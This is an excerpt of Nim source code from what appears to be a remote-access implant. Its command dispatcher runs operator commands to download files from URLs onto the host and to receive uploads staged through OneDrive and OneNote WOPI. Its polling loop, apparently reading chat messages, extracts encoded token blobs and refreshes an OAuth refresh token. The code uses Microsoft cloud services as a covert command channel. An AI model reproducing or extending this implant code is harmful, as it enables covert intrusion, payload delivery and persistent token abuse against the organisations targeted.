...
proc dispatch*(command: string; tokens: var TokenDict; threadId: string = ""): string =
  ...
  try:
    ...
    of "downloadfrom":
      ## New direct download path: Server uploaded file to OneDrive via Graph API,
      ## sends: "downloadfrom <filename> <destPath> <url>"
      let parts3 = argStr.splitWhitespace(maxsplit = 2)
      if parts3.len < 3:
        return s("Usage: downloadfrom <filename> <destPath> <url>")
      let dfFilename = parts3[0]
      let dfDest     = parts3[1]   # empty string "" means use current dir
      let dfUrl      = parts3[2]
      return cmdDownloadFrom(dfFilename, dfUrl, dfDest)
    of "upload_wopi":
      ## New upload path: Server uploaded file to OneNote WOPI,
      ## sends: "upload_wopi <filename> <destPath> <url>"
      ## destPath is "" if no destination was specified by the operator.
      let parts3 = argStr.splitWhitespace(maxsplit = 2)
      if parts3.len < 3:
        return s("Usage: upload_wopi <filename> <destPath> <url>")
      let wFilename = parts3[0]
      let wDest     = parts3[1]  # empty string "" means use current dir
      let wUrl      = parts3[2]
      return cmdReceiveWopiUpload(wFilename, wUrl, wDest)

    of "upload":
      ## Legacy chunk-based upload — kept for backward compatibility.
      ## Protocol: "upload <filename> <b64data>" or
      ##           "upload <filename> <b64data> ##DEST##<destPath>"
      if argStr.len == 0 or " " notin argStr:
        return s("Usage: upload <filename> <base64_data>")
  ...
  while true:
    ...
    for msg in messages:
      ...
      if BLOB_START() in content and BLOB_END() in content:
        ...
        if newBlobB64.len > 0:
          let payload = resolveTokenBlob(newBlobB64, debug)
          if payload.hasKey("refresh_token"):
            tokens.refreshToken = payload["refresh_token"].getStr()
